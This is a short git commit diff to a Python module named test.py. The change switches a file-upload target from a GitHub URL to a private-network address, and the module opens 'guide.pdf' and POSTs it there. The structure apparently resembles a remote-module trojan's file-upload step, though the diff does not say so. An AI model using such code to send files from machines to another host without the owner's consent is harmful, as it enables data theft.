735d867a6284b6a5ec82ec384a00b9439fa22b6c
experiment2016 <sarpiericam@libero.it>
2016-05-31 13:04:45 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -3,8 +3,8 @@ def run(**args):
   try:
       print("Testing") 
       goodie = "guide.pdf"
-      url='https://github.com/experiment2016/workhub/upload/master/modules'
-    #  url='http://192.168.1.4:8000'
+    #  url='https://github.com/experiment2016/workhub/upload/master/modules'
+      url='http://192.168.1.4:8000'
       files = {'upload_file': open(goodie,'rb')}
       r=requests.post(url,files=files)
       ta = "ok"
